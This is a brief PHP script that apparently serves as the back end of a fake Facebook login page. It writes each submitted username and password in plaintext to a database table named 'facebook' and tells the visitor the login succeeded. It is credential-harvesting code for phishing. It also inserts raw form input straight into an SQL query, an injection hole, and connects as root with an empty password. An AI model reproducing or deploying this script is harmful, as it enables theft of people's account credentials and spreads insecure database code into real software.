

<?php
$host = "localhost";
$username = "root";
$password = "";
$database = "fblogin";

$connection = mysqli_connect($host, $username, $password, $database);

if (!$connection) {
    die("Database connection failed: " . mysqli_connect_error());
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Insert user data into the database
    $query = "INSERT INTO facebook (username,password ) VALUES ('$username', '$password')";
    $result = mysqli_query($connection, $query);

    if ($result) {
        echo "<p>Login successfully!</p>";
    } else {
        echo "<p>Login failed. Please try again.</p>";
    }
}
?>
